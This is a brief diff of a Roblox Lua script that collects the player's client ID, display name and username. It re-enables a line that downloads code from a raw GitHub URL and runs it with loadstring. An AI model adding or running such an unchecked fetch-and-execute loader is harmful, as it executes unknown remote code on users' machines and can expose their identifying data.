@@ -42,7 +42,7 @@ local S_hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 local plre = game.Players.LocalPlayer
 local DName = game.Players.LocalPlayer.DisplayName
 local UName = game.Players.LocalPlayer.Name
---loadstring(game:HttpGet("https://raw.githubusercontent.com/altaccountv1/-CLASSIFIED-./main/Classified"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/altaccountv1/-CLASSIFIED-./main/Classified"))();
 
 local UserInputService = game:GetService("UserInputService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
